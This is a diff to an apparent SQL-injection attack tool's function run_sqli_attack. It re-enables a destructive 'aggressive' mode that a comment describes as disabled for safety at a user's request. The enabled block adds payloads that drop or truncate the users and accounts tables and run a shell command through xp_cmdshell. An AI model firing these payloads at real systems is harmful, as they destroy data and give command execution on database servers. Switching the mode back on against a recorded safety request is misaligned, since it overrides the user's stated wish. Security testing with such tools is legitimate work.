@@ -46,15 +46,16 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     ]
     
     # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
-    # USER REQUEST: Disabled for safety. Uncomment to enable destructive mode.
-    # is_destructive = scenario.config.get("aggressive", False)
-    # if is_destructive:
-    #     payloads.extend([
-    #         {"payload": "'; DROP TABLE users; --", "type": "schema_modification"},
-    #         {"payload": "'; DROP TABLE accounts; --", "type": "schema_modification"},
-    #         {"payload": "'; TRUNCATE TABLE users; --", "type": "schema_modification"},
-    #         {"payload": "'; EXEC xp_cmdshell('echo HACKED > C:\\hacked.txt'); --", "type": "rce_via_sqli"}
-    #     ])
+    # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
+    is_destructive = scenario.config.get("aggressive", False)
+    if is_destructive:
+        print("    [!!!] INJECTING DESTRUCTIVE SQL COMMANDS (DROP/TRUNCATE)")
+        payloads.extend([
+            {"payload": "'; DROP TABLE users; --", "type": "schema_modification"},
+            {"payload": "'; DROP TABLE accounts; --", "type": "schema_modification"},
+            {"payload": "'; TRUNCATE TABLE users; --", "type": "schema_modification"},
+            {"payload": "'; EXEC xp_cmdshell('echo HACKED > C:\\hacked.txt'); --", "type": "rce_via_sqli"}
+        ])
     
     fields = scenario.config.get("fields", ["username", "password", "id", "q"])
     variants = []
